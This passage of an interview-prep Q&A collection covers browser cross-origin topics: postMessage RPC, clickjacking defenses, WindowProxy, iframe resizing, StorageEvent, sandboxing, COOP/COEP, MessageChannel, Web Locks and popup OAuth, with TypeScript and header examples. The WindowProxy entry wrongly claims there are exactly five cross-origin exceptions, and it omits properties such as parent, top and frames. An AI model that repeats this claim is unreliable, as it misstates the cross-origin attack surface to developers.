**Direct answer:** Because `window.postMessage` is fire-and-forget (asynchronous without a return value), implementing a request-response Remote Procedure Call (RPC) protocol requires correlating outgoing requests with incoming responses using unique transaction identifiers (UUIDs). The client attaches a UUID to the message and stores a pending Promise's `resolve` and `reject` handles in an in-memory map. The receiver processes the request and replies with the same UUID. When the response arrives, the client matches the UUID and resolves the Promise.

```typescript
interface RPCMessage {
    id: string;          // Correlation UUID
    type: 'REQUEST' | 'RESPONSE';
    method?: string;
    params?: any;
    result?: any;
    error?: string;
}

export class IframeRPCClient {
    private pending = new Map<string, { resolve: (res: any) => void; reject: (err: any) => void }>();

    constructor(private targetWindow: Window, private targetOrigin: string) {
        window.addEventListener('message', (event) => {
            if (event.origin !== this.targetOrigin) return;
            const msg: RPCMessage = event.data;
            if (msg?.type === 'RESPONSE' && this.pending.has(msg.id)) {
                const { resolve, reject } = this.pending.get(msg.id)!;
                this.pending.delete(msg.id);
                if (msg.error) reject(new Error(msg.error));
                else resolve(msg.result);
            }
        });
    }

    call<T>(method: string, params: any, timeoutMs: number = 5000): Promise<T> {
        const id = crypto.randomUUID();
        return new Promise((resolve, reject) => {
            const timer = setTimeout(() => {
                this.pending.delete(id);
                reject(new Error(`RPC Timeout for method: ${method}`));
            }, timeoutMs);

            this.pending.set(id, {
                resolve: (res) => { clearTimeout(timer); resolve(res); },
                reject: (err) => { clearTimeout(timer); reject(err); }
            });

            this.targetWindow.postMessage({ id, type: 'REQUEST', method, params }, this.targetOrigin);
        });
    }
}
```

**Complexity analysis and mechanics:**
- **Correlation lookup:** O(1) hash map lookup by UUID upon message arrival.
- **Timeout cleanup:** Every pending RPC must enforce a timeout timer to prevent orphaned Promises from leaking memory if the target window crashes.

**Algorithmic mechanics and edge cases:**
For high-throughput applications, libraries like `Comlink` or `penpal` use this exact architecture over `MessageChannel`, exposing remote iframe objects as seamless async ES6 proxies.

## Why

UUID correlation transforms asynchronous, decoupled postMessage calls into clean async/await Promise functions.

## Worked Case

Walkthrough scenario: A parent app embeds a sandboxed checkout iframe and needs to query validateAddress(address). Calling client.call('validateAddress', addr) generates UUID-101, stores the promise in this.pending, and sends postMessage. The iframe verifies the address and replies with { id: 'UUID-101', type: 'RESPONSE', result: { valid: true } }. The parent resolves the promise, allowing the checkout step to proceed with standard async/await syntax.

## Risk

Failing to implement timeout cleanup causes pending promise maps to grow unbounded if the target iframe fails to respond.

## Trade-off

Adds wrapper protocol serialization overhead to enable synchronous-feeling request/response communication.

## Try This

Implement IframeRPCClient and test invoking a mock 'calculateTax' method inside an embedded iframe with async/await.

## Follow-ups

### What open source library popularizes using ES6 Proxies over postMessage for RPC?

Comlink (by Google Chrome Labs) uses ES6 Proxies to make objects in Web Workers or iframes feel like local asynchronous JavaScript objects.

## Citations

- https://github.com/GoogleChromeLabs/comlink
- https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

# How do X-Frame-Options and Content Security Policy frame-ancestors protect applications against Clickjacking attacks?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Clickjacking (UI Redressing) is an attack where an attacker embeds a vulnerable target website inside an invisible (`opacity: 0.0001`), framed `<iframe>` placed directly over an enticing visual decoy (e.g. 'Click here to win a prize!'). When the user clicks the decoy, they are unknowingly clicking buttons inside the transparent framed application (e.g., 'Transfer Funds' or 'Delete Account').

Defenses are enforced via HTTP response headers:
1. **`Content Security Policy: frame-ancestors` (Modern Standard):** Dictates which origins are permitted to embed the page in `<frame>`, `<iframe>`, `<object>`, or `<embed>`.
   - `frame-ancestors 'none';` -> Completely prohibits all embedding (most secure).
   - `frame-ancestors 'self';` -> Only permits pages on the exact same origin to embed it.
   - `frame-ancestors 'self' https://trusted-partner.com;` -> Explicit allowlist.
2. **`X-Frame-Options` (Legacy Defense):**
   - `X-Frame-Options: DENY` -> Blocks all framing.
   - `X-Frame-Options: SAMEORIGIN` -> Only same-origin embedding allowed.

```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Security-Policy: frame-ancestors 'none';
X-Frame-Options: DENY
```

**Complexity analysis and mechanics:**
- **Header precedence:** If both are present, modern browsers ignore `X-Frame-Options` in favor of `Content-Security-Policy: frame-ancestors`.
- **Why framebusting JS scripts fail:** Legacy JavaScript framebusting scripts (`if (top !== self) top.location = self.location`) can be defeated by attackers using `<iframe sandbox="allow-scripts">`, which prevents top-level navigation while permitting scripts to run.

**Algorithmic mechanics and edge cases:**
`X-Frame-Options: ALLOW-FROM` is deprecated and ignored by modern browsers. If you need to allow specific multiple partner origins to embed your application, you must use CSP `frame-ancestors`.

## Why

frame-ancestors blocks framing at the browser network layer before malicious UI overlay clicks can be executed.

## Worked Case

Walkthrough scenario: An attacker creates free-movies.com and embeds bank.com/transfer inside an invisible iframe directly over a 'Play Movie' button. A logged-in user clicks 'Play' and unknowingly transfers \$500 to the attacker. When bank.com deploys Content-Security-Policy: frame-ancestors 'none', the browser refuses to render the iframe inside free-movies.com, displaying a grey frame block and completely defeating the clickjacking exploit.

## Risk

Relying on JavaScript framebusting scripts fails because sandboxed iframes can restrict top navigation, neutralizing the script.

## Trade-off

frame-ancestors 'none' prevents legitimate embedding; partners must be explicitly enumerated in the policy.

## Try This

Configure Content-Security-Policy: frame-ancestors 'none' on an endpoint and attempt to embed it in an iframe in DevTools.

## Follow-ups

### Why is X-Frame-Options: ALLOW-FROM deprecated in modern web standards?

ALLOW-FROM was inconsistently implemented across browsers and only supported a single domain; CSP frame-ancestors supersedes it with full domain list support.

## Citations

- https://owasp.org/www-community/attacks/Clickjacking
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors

# What is WindowProxy in the browser environment, and what properties can be accessed across origins under SOP?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** In browser specifications, every window, tab, and iframe context has an underlying `Window` object. However, scripts never interact directly with the raw `Window` object; they interact with a **`WindowProxy`** object that acts as a secure wrapper. When a window navigates to a new URL, the underlying `Window` object is destroyed and recreated, but the `WindowProxy` reference remains stable.

Under the Same-Origin Policy (SOP), accessing properties on a cross-origin `WindowProxy` is strictly forbidden, **with exactly five exceptions**:
1. **`window.postMessage`:** The method used to send structured messages.
2. **`window.close`:** Allowed only if the current script opened the window via `window.open`.
3. **`window.closed`:** Boolean indicating whether the target window has been closed.
4. **`window.focus` / `window.blur`:** Methods to focus or blur the window.
5. **`window.location` (Write-only):** Scripts can *write* to `window.location.href` to navigate the target window, but attempting to *read* `window.location.href` throws a `SecurityError`.

```typescript
const popup = window.open('https://cross-origin.com', '_blank');
if (popup) {
    // PERMITTED CROSS-ORIGIN ACCESS:
    popup.postMessage({ ping: true }, 'https://cross-origin.com');
    console.log(popup.closed); // false
    popup.location.href = 'https://another-url.com'; // Permitted navigation write!

    // FORBIDDEN CROSS-ORIGIN ACCESS (Throws DOMException: Blocked a frame with origin...):
    // console.log(popup.location.href); // SecurityError!
    // console.log(popup.document);      // SecurityError!
}
```

**Complexity analysis and mechanics:**
- **Proxy interposer:** WindowProxy intercepts all property get/set operations, comparing caller origin against current target origin before delegating.
- **Navigation persistence:** Holding a reference `const ref = window.open(...)` preserves `ref` even after the popup navigates through multiple redirects.

**Algorithmic mechanics and edge cases:**
Because `popup.closed` is accessible across origins, applications polling an OAuth popup poll `if (popup.closed)` in a `setInterval` to detect when the user closed the authentication window without completing login.

## Why

WindowProxy preserves window references across navigations while strictly enforcing cross-origin property access security.

## Worked Case

Walkthrough scenario: An OAuth login flow opens window.open('https://auth.provider.com'). The parent sets an interval: const timer = setInterval(() => { if (popup.closed) { clearInterval(timer); handleCancel(); } }, 500). Because popup.closed is one of the five permitted cross-origin properties on WindowProxy, the parent reliably detects user cancellation without triggering SecurityError.

## Risk

Attempting to read properties like popup.location.href across origins crashes the script with an unhandled SecurityError.

## Trade-off

Allows basic window orchestration (navigating, closing, messaging) without exposing private DOM, cookies, or URLs.

## Try This

Open a cross-origin window.open('https://google.com') in the browser console and inspect which properties can be read without errors.

## Follow-ups

### Why is writing to window.location.href permitted across origins, but reading it is blocked?

Writing allows navigating the window to a new destination; reading it is blocked because the URL may contain sensitive tokens, session IDs, or private path parameters.

## Citations

- https://html.spec.whatwg.org/multipage/window-object.html#the-windowproxy-exotic-object
- https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#cross-origin_data_storage_access

# How do you safely resize responsive embedded iframes dynamically using ResizeObserver and postMessage?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Embedded iframes do not automatically expand to fit their inner document content; without explicit sizing, they default to fixed dimensions (typically 300x150) and show vertical scrollbars. Because the parent cannot read the iframe's DOM across origins, the **child iframe must observe its own content dimensions using `ResizeObserver`** and transmit updated scroll heights to the parent via `postMessage`. The parent window verifies the origin and adjusts the iframe's CSS height dynamically.

```typescript
// 1. INSIDE CHILD IFRAME (embedded content):
const observer = new ResizeObserver((entries) => {
    const entry = entries[0];
    const height = Math.ceil(entry.contentRect.height);
    window.parent.postMessage(
        { type: 'IFRAME_RESIZE', height },
        'https://parent-app.example.com'
    );
});
observer.observe(document.documentElement);

// 2. INSIDE PARENT WINDOW (hosting page):
const iframe = document.getElementById('embedded-widget') as HTMLIFrameElement;
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://child-widget.example.com') return;
    if (event.data?.type === 'IFRAME_RESIZE') {
        // Apply calculated height directly to avoid scrollbars:
        iframe.style.height = `${event.data.height}px`;
    }
});
```

**Complexity analysis and mechanics:**
- **Event loop efficiency:** `ResizeObserver` batches DOM layout measurements before paint, preventing layout thrashing.
- **Debounce / Thresholding:** To prevent infinite resize loops (where changing iframe height changes child container layout), round heights up to integers and ignore changes smaller than 2px.

**Algorithmic mechanics and edge cases:**
Ensure the iframe has CSS `scrolling="no"` or `overflow: hidden` on the child document to prevent temporary double scrollbars while height messages are in transit.

## Why

ResizeObserver paired with postMessage delivers seamless auto-resizing iframe embeds without ugly double scrollbars.

## Worked Case

Walkthrough scenario: A customer support chat widget lives inside an iframe on an e-commerce store. When collapsed, the widget is 60px high. When the user clicks 'Chat', the widget expands to 450px. ResizeObserver inside the iframe detects the DOM height increase and posts { type: 'IFRAME_RESIZE', height: 450 } to the parent. The parent sets iframe.style.height = '450px' in 1 frame, eliminating scrollbars.

## Risk

Failing to round heights or threshold changes can trigger infinite oscillation loops where height changes cause scrollbar toggling.

## Trade-off

Requires deploying cooperative messaging code on both the parent container and child iframe documents.

## Try This

Observe document.documentElement with ResizeObserver inside an iframe and log heights as dynamic content is appended.

## Follow-ups

### What causes infinite resize loops in auto-resizing iframes?

If the child height calculation includes scrollbars that disappear once expanded, the height shrinks, reintroducing scrollbars and looping endlessly.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/ResizeObserver
- https://github.com/davidjbradshaw/iframe-resizer

# How does the StorageEvent API detect and synchronize localStorage mutations across different open windows?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The `StorageEvent` fires on the `window` object whenever a storage area (`localStorage` or `sessionStorage`) is modified by **another document within the same origin**. It provides key information about the change: `key`, `oldValue`, `newValue`, and `url`. Crucially, **the `storage` event does NOT fire in the tab that made the change**; it only fires in all *other* open tabs and windows of the same origin, making it an ideal zero-overhead mechanism for cross-tab synchronization.

```typescript
// Cross-Tab Cart and Auth Synchronization Hook / Listener:
export function initCrossTabSync() {
    window.addEventListener('storage', (event: StorageEvent) => {
        // 1. Only listen to localStorage changes
        if (event.storageArea !== localStorage) return;

        // 2. Handle Authentication changes:
        if (event.key === 'auth_token') {
            if (!event.newValue) {
                console.warn('User logged out in another tab. Redirecting...');
                window.location.href = '/login';
            } else {
                console.log('User signed in with new token in another tab.');
                window.location.reload();
            }
        }

        // 3. Handle Cart sync:
        if (event.key === 'cart_items') {
            const newCart = JSON.parse(event.newValue || '[]');
            updateLocalCartState(newCart);
        }
    });
}
```

**Complexity analysis and mechanics:**
- **Trigger condition:** Fires only on actual value mutations (`setItem`, `removeItem`, `clear`). Assigning an identical value does not fire the event in modern engines.
- **Clear handling:** If `localStorage.clear()` is called, `event.key` is `null` and `event.newValue` is `null`.

**Algorithmic mechanics and edge cases:**
`sessionStorage` changes never trigger cross-tab storage events because `sessionStorage` is strictly isolated to its own individual tab/window context. For newer applications, `BroadcastChannel` is preferred because it avoids synchronous disk serialization, but `storage` events remain universally supported back to IE8.

## Why

StorageEvent enables multi-tab session synchronization and immediate cross-tab logout with zero library dependencies.

## Worked Case

Walkthrough scenario: A user opens an e-commerce site in two tabs. In Tab 1, the user adds a jacket to the cart. localStorage.setItem('cart_items', JSON.stringify(cart)) executes. Tab 2 receives the StorageEvent with key='cart_items', parses the new cart JSON, and updates the cart badge icon from '0' to '1' immediately without requiring a page refresh.

## Risk

Assuming the storage event fires in the tab that called setItem(); it only fires in other peer tabs.

## Trade-off

localStorage writes are synchronous and block the main thread; BroadcastChannel is preferred for high-frequency messaging.

## Try This

Open two tabs of the same origin, execute localStorage.setItem('foo', 'bar') in Tab 1, and inspect window.onstorage in Tab 2.

## Follow-ups

### Does the storage event fire when sessionStorage is modified?

No, sessionStorage is scoped strictly to the current top-level browsing context and tab; it never synchronizes across different tabs.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Window/storage_event
- https://developer.mozilla.org/en-US/docs/Web/API/StorageEvent

# How do you securely embed and sandbox a third-party checkout widget or authentication modal inside an iframe?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Embedding third-party widgets (e.g. Stripe, PayPal, Auth0) securely requires defense-in-depth: combining restrictive iframe sandboxing, origin-locked postMessage channels, explicit feature policies, and HTTPS encryption. The embedded frame must be granted *only* the minimum capabilities necessary to operate, and communication must follow a typed protocol.

```html
<!-- Restrictive Sandbox Configuration for Checkout Widget -->
<iframe
    id="secure-checkout-frame"
    src="https://checkout.payments-partner.com/embed"
    sandbox="allow-scripts allow-forms allow-same-origin"
    allow="payment 'src'"
    loading="lazy"
    title="Secure Checkout Form"
    style="border: none; width: 100%; height: 400px;">
</iframe>
```

```typescript
// Secure Parent Communication Handler:
export class CheckoutManager {
    private expectedOrigin = 'https://checkout.payments-partner.com';

    constructor(private onComplete: (paymentId: string) => void) {
        window.addEventListener('message', this.handleMessage);
    }

    private handleMessage = (event: MessageEvent) => {
        if (event.origin !== this.expectedOrigin) return; // Strict origin filter
        const { type, paymentId } = event.data || {};
        if (type === 'PAYMENT_SUCCESS' && typeof paymentId === 'string') {
            this.onComplete(paymentId);
        }
    };
}
```

**Complexity analysis and mechanics:**
- **Payment Request API delegation:** `allow="payment 'src'"` explicitly delegates the Web Payments API to the iframe while blocking access to camera, microphone, and geolocation.
- **Same-origin scoping:** In this scenario, `allow-same-origin` allows the checkout frame to communicate with its own payments domain cookies (to authenticate the user's saved cards) without granting access to the parent's domain.

**Algorithmic mechanics and edge cases:**
Never allow `allow-top-navigation` on third-party widgets unless explicitly required, as malicious advertisers or hijacked widgets can redirect the parent ecommerce page to an exploit site.

## Why

Granular sandbox flags and strict origin filtering isolate payment tokenization from main application vulnerabilities.

## Worked Case

Walkthrough scenario: An e-commerce store needs to achieve PCI-DSS SAQ-A compliance. By rendering credit card inputs inside an iframe hosted by Stripe on js.stripe.com, credit card numbers never touch the merchant's DOM, JavaScript memory, or servers. The iframe collects card details, tokenizes with Stripe, and sends { token: 'tok_123' } to the parent via postMessage.

## Risk

Granting allow-top-navigation permits a compromised widget to redirect the user's browser away to a phishing site.

## Trade-off

Prevents direct DOM interaction, requiring all configuration and token handshakes to travel over postMessage.

## Try This

Inspect an embedded Stripe Elements iframe in Chrome DevTools to observe its sandbox, permissions, and postMessage architecture.

## Follow-ups

### Why does PCI-DSS compliance favor iframe embedding over direct client-side API requests for credit cards?

With iframes, card numbers are entered directly into the payment processor's isolated DOM, keeping the merchant out of PCI scope (SAQ-A vs SAQ A-EP).

## Citations

- https://stripe.com/docs/security/guide#saq-a
- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#allow

# What are the capabilities and security constraints of the Cross-Origin Embedder Policy (COEP) and COOP?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Following the discovery of microarchitectural CPU side-channel vulnerabilities (Spectre and Meltdown), browsers disabled high-resolution timers (`performance.now()` precision was reduced) and restricted `SharedArrayBuffer` because attackers could measure microsecond cache timing differences across origins within the same process. To safely re-enable `SharedArrayBuffer` and multi-threaded WebAssembly, browsers introduced **Cross-Origin Isolation** enforced via two HTTP headers:
1. **`Cross-Origin-Opener-Policy: same-origin` (COOP):** Isolates the browsing context group, ensuring other cross-origin windows cannot obtain a reference to your window via `window.opener`.
2. **`Cross-Origin-Embedder-Policy: require-corp` (COEP):** Guarantees that any cross-origin resource (images, scripts, iframes) embedded in the page must explicitly opt-in via Cross-Origin Resource Policy (`CORP`) or CORS.

```http
HTTP/1.1 200 OK
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

```typescript
// Once Cross-Origin Isolation is enabled:
if (window.crossOriginIsolated) {
    // SharedArrayBuffer is unlocked!
    const sharedBuffer = new SharedArrayBuffer(1024);
    console.log('SharedArrayBuffer enabled for multi-threaded WebAssembly!');
}
```

**Complexity analysis and mechanics:**
- **`window.crossOriginIsolated`:** A boolean property reflecting whether both COOP and COEP are active.
- **Impact on embeds:** Any external asset (e.g. `<img src="https://other.com/cat.jpg">`) without `Cross-Origin-Resource-Policy: cross-origin` or CORS will be blocked by the browser.

**Algorithmic mechanics and edge cases:**
To embed third-party iframes without requiring upstream CORP headers, modern browsers support `Cross-Origin-Embedder-Policy: credentialless`, which strips cookies and client credentials from cross-origin requests, satisfying COEP without breaking existing assets.

## Why

COOP and COEP create process isolation barriers that safely unlock SharedArrayBuffer and high-precision timers.

## Worked Case

Walkthrough scenario: An in-browser video editor uses WebAssembly FFmpeg to render 4K video clips. Single-threaded WASM is too slow. Multi-threaded WASM requires SharedArrayBuffer. Setting COOP: same-origin and COEP: require-corp isolates the process, setting crossOriginIsolated = true. SharedArrayBuffer unlocks, and video rendering runs 8x faster across 8 Web Worker CPU threads.

## Risk

Enabling require-corp breaks third-party images, analytics scripts, and iframes that lack explicit CORP headers.

## Trade-off

Unlocks multi-threaded WebAssembly performance at the cost of requiring all third-party embedded assets to configure CORS/CORP.

## Try This

Check window.crossOriginIsolated in browser console and observe it is false by default on standard web pages.

## Follow-ups

### What does COEP: credentialless do as an alternative to require-corp?

credentialless loads cross-origin subresources without cookies or authentication headers, allowing them to load without requiring explicit CORP headers.

## Citations

- https://web.dev/articles/coop-coep
- https://developer.mozilla.org/en-US/docs/Web/API/Window/crossOriginIsolated

# How do MessageChannel and MessagePort provide private point-to-point communication channels between frames?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** While `window.postMessage` broadcasts to a window's global event listener (where any attached script can listen), the `MessageChannel` API creates an isolated, direct, two-way pipe between two distinct execution contexts. A `new MessageChannel()` instantiates two entangled ports: `port1` and `port2`. The creator keeps `port1` and transfers `port2` to another window or worker via `window.postMessage([port2])`. Once transferred, communication flows exclusively and privately through `port1` and `port2` without touching the global window message bus.

```typescript
// In Parent Window:
const iframe = document.getElementById('secure-frame') as HTMLIFrameElement;
const channel = new MessageChannel();

// 1. Keep port1 in parent:
channel.port1.onmessage = (event) => {
    console.log('Private response from iframe:', event.data);
};

// 2. Transfer port2 to iframe (ownership moves!):
iframe.contentWindow?.postMessage('INIT_CHANNEL', 'https://widget.example.com', [channel.port2]);

// Send private messages anytime through port1:
channel.port1.postMessage({ action: 'GET_DATA' });

// In Child Iframe Window:
window.addEventListener('message', (event) => {
    if (event.origin !== 'https://parent.example.com') return;
    if (event.data === 'INIT_CHANNEL') {
        const privatePort = event.ports[0]; // Received port2!
        privatePort.onmessage = (e) => {
            console.log('Received private request:', e.data);
            privatePort.postMessage({ result: 42 }); // Direct private reply!
        };
    }
});
```

**Complexity analysis and mechanics:**
- **Zero eavesdropping:** Other scripts listening to `window.onmessage` cannot intercept messages flowing over an entangled `MessagePort`.
- **Transferable Objects:** `channel.port2` is transferred using the transfer list parameter; it becomes neutered in the sender.

**Algorithmic mechanics and edge cases:**
If using `port.addEventListener('message', ...)` instead of property assignment `port.onmessage = ...`, you must explicitly invoke `port.start()` to begin receiving queued messages.

## Why

MessageChannel creates private point-to-point communication tunnels that third-party scripts on the global window cannot spy on.

## Worked Case

Walkthrough scenario: A dashboard hosts two third-party iframes: StockChart and TradeExecution. StockChart needs to stream live tick data directly to TradeExecution. Instead of routing 1,000 messages/sec through the parent window, the parent creates a MessageChannel, passes port1 to StockChart and port2 to TradeExecution. The two iframes stream directly between each other, completely bypassing the parent.

## Risk

Failing to call port.start() when using addEventListener causes messages to remain permanently queued and unhandled.

## Trade-off

Requires an initial postMessage handshake to transfer the port before point-to-point messaging can begin.

## Try This

Create a MessageChannel, transfer port2 to a Web Worker, and communicate over port1 without global worker onmessage handlers.

## Follow-ups

### What is the difference between port.onmessage and port.addEventListener('message')?

Setting port.onmessage automatically calls port.start() under the hood, whereas addEventListener requires manual port.start() to begin queue processing.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel
- https://developer.mozilla.org/en-US/docs/Web/API/MessagePort

# How do you implement cross-tab leader election to ensure only one tab performs background synchronization?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** When users keep multiple tabs open to an application, having all tabs simultaneously execute background polling, token refreshes, or database writes wastes resources and causes race conditions. **Leader Election** elects exactly one tab as the authoritative 'Leader' to handle background tasks while all other tabs act as 'Followers'. The modern web standard implementation uses the **Web Locks API (`navigator.locks`)**, which provides atomic, browser-enforced mutex locking with automatic cleanup on tab crash.

```typescript
export class TabLeaderElection {
    private isLeader = false;

    constructor(private onElected: () => void) {
        this.startElection();
    }

    private startElection() {
        if (!('locks' in navigator)) {
            // Fallback for older browsers: use BroadcastChannel + heartbeat
            this.onElected();
            return;
        }

        // Request exclusive lock named 'app_background_sync_leader':
        navigator.locks.request('app_background_sync_leader', async (lock) => {
            this.isLeader = true;
            console.log('This tab is now the elected LEADER!');
            this.onElected();

            // Keep lock held indefinitely by returning an unresolved promise:
            return new Promise<void>(() => {
                // Lock automatically releases when tab closes or navigates!
            });
        });
    }

    get isCurrentLeader() { return this.isLeader; }
}
```

**Complexity analysis and mechanics:**
- **Atomic browser coordination:** `navigator.locks` is managed directly by the browser process; two tabs can never acquire the lock simultaneously.
- **Zero-leak failover:** If the leader tab crashes, freezes, or closes, the browser automatically releases the lock within milliseconds, granting it to the next queued tab in line.

**Algorithmic mechanics and edge cases:**
In legacy browsers lacking Web Locks, developers implemented leader election using `localStorage` keys with expiry timestamps (`leader_heartbeat`) and `storage` event listeners, but this suffered from clock skew and stale lock bugs when tabs crashed.

## Why

Web Locks API guarantees atomic, crash-resilient leader election across tabs without clock skew or heartbeat polling.

## Worked Case

Walkthrough scenario: An application synchronizes IndexedDB with a backend server every 10 seconds. A user opens 8 tabs. Without leader election, all 8 tabs poll the server every 10 seconds (48 requests/min). With TabLeaderElection via Web Locks, Tab 1 acquires the lock and polls the server, sharing results to Tabs 2-8 via BroadcastChannel (6 requests/min). When Tab 1 is closed, Tab 2 claims the lock in 5ms and resumes polling.

## Risk

Resolving the lock promise prematurely releases the lock, allowing another tab to claim leadership concurrently.

## Trade-off

Requires browser support for Web Locks API (supported in all modern browsers since Chrome 69, Safari 15.4, Firefox 96).

## Try This

Open two tabs using Web Locks leader election, close the active leader tab, and watch the second tab claim leadership instantly.

## Follow-ups

### What happens if a tab holding a Web Lock crashes or is terminated by the OS?

The browser process detects context termination and automatically releases all held locks, instantly granting them to the next waiting tab.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Web_Locks_API
- https://developer.mozilla.org/en-US/docs/Web/API/LockManager/request

# How do iframe credentialless and permission policy attributes restrict embedded frame capabilities?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Modern web security enforces least privilege through two granular controls:
1. **`credentialless` attribute:** Loads the `<iframe>` in a new, ephemeral context where network requests omit all ambient credentials (cookies, client certificates, HTTP authentication). This allows embedding cross-origin content within `COEP: require-corp` documents without requiring the embedded origin to configure complex CORS headers.
2. **`allow` (Permissions Policy):** Explicitly defines which browser hardware and sensitive web APIs the embedded iframe is allowed to access (e.g. `camera`, `microphone`, `geolocation`, `payment`, `fullscreen`, `display-capture`). By default, powerful APIs are disabled unless explicitly delegated via `allow`.

```html
<!-- Secure Embedded Video Frame with Least Privilege API Access -->
<iframe
    src="https://videos.partner.com/player/42"
    credentialless
    allow="fullscreen; autoplay; encrypted-media 'src'"
    sandbox="allow-scripts allow-same-origin"
    title="Video Player">
</iframe>
```

**Complexity analysis and mechanics:**
- **Permission inheritance:** By default, if the parent page lacks a permission (e.g. user denied geolocation), an iframe cannot access it even if listed in `allow`.
- **Explicit origin scoping:** `allow="camera 'src'"` restricts camera access specifically to the iframe's `src` origin, preventing third-party redirects inside the frame from stealing camera privileges.

**Algorithmic mechanics and edge cases:**
If an iframe attempts to invoke `navigator.mediaDevices.getUserMedia()` without `allow="camera; microphone"`, the browser immediately rejects the promise with a `NotAllowedError` DOMException without prompting the user.

## Why

Permissions Policy guarantees embedded widgets cannot secretly access user cameras, microphones, or geolocation sensors.

## Worked Case

Walkthrough scenario: An application embeds an advertising widget. The ad script attempts to silently activate the laptop microphone to record ambient audio for ad targeting. Because the iframe tag specifies allow="fullscreen" and omits microphone, the browser blocks the microphone API call at the hardware layer with zero user prompt.

## Risk

Omitting explicit allow attributes or granting allow='*' gives embedded third-party scripts unrestricted hardware access.

## Trade-off

Requires auditing all third-party widget requirements and specifying explicit capability lists on iframe tags.

## Try This

Attempt to call navigator.geolocation in an iframe without allow='geolocation' and verify NotAllowedError is returned.

## Follow-ups

### What is the difference between allow='geolocation *' and allow='geolocation src'?

allow='geolocation *' allows any nested document or redirect inside the iframe to use geolocation; 'src' restricts it strictly to the iframe's initial src origin.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#allow
- https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy

# How do popups, modal windows, and parent windows securely synchronize OAuth authentication redirects?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** Modern web applications frequently use popup windows for OAuth / OpenID Connect login flows (e.g., 'Sign in with Google' or 'Sign in with GitHub') to avoid disrupting the user's active page state. The parent window opens the popup, listens for completion via `window.addEventListener('message')`, and the popup completes the OAuth redirect handshake, transmits the authorization result back to the parent via `window.opener.postMessage`, and closes itself.

```typescript
// 1. IN PARENT WINDOW (Main Application):
export function loginWithOAuth(authUrl: string, expectedOrigin: string): Promise<string> {
    return new Promise((resolve, reject) => {
        const width = 500, height = 600;
        const left = window.screenX + (window.outerWidth - width) / 2;
        const top = window.screenY + (window.outerHeight - height) / 2;
        const popup = window.open(authUrl, 'OAuthLogin', `width=${width},height=${height},left=${left},top=${top}`);

        const handleMessage = (event: MessageEvent) => {
            if (event.origin !== expectedOrigin) return; // Strict origin filter!
            if (event.data?.type === 'OAUTH_AUTH_CODE') {
                window.removeEventListener('message', handleMessage);
                clearInterval(pollTimer);
                resolve(event.data.code);
            }
        };
        window.addEventListener('message', handleMessage);

        // Detect if user closed popup manually:
        const pollTimer = setInterval(() => {
            if (popup?.closed) {
                clearInterval(pollTimer);
                window.removeEventListener('message', handleMessage);
                reject(new Error('User cancelled login popup'));
            }
        }, 500);
    });
}

// 2. IN POPUP CALLBACK WINDOW (https://app.example.com/oauth/callback.html):
const urlParams = new URLSearchParams(window.location.search);
const code = urlParams.get('code');
if (window.opener) {
    window.opener.postMessage({ type: 'OAUTH_AUTH_CODE', code }, 'https://app.example.com');
    window.close(); // Close popup immediately!
}
```

**Complexity analysis and mechanics:**
- **State validation (CSRF defense):** The parent generates a random cryptographic `state` parameter stored in memory, verified when the popup returns.
- **Zero session reload:** Keeps single-page app state, form drafts, and audio/video playback active without full-page navigation.

**Algorithmic mechanics and edge cases:**
Mobile browsers (iOS Safari) often block `window.open` popups unless triggered directly by a synchronous user click. On mobile devices, OAuth flows should use full-page redirects (`window.location.href`) rather than popup windows.

## Why

Popup OAuth synchronization preserves the parent single-page application's memory and state during authentication.

## Worked Case

Walkthrough scenario: A user working on an unsaved 1,000-word blog post needs to re-authenticate with Google. A full-page redirect would blow away the unsaved post. The app opens loginWithOAuth(). The user signs in via the popup. The popup posts the authorization code back to the parent and closes. The parent exchanges the code for a token and saves the post with zero data loss.

## Risk

Omitting the popup.closed check leaves the parent promise permanently pending if the user closes the popup window manually.

## Trade-off

Popup windows are blocked by mobile Safari and aggressive ad blockers, requiring full-page redirect fallbacks.

## Try This

Click an OAuth popup button, close the popup without logging in, and verify that the parent catches 'User cancelled login popup'.

## Follow-ups

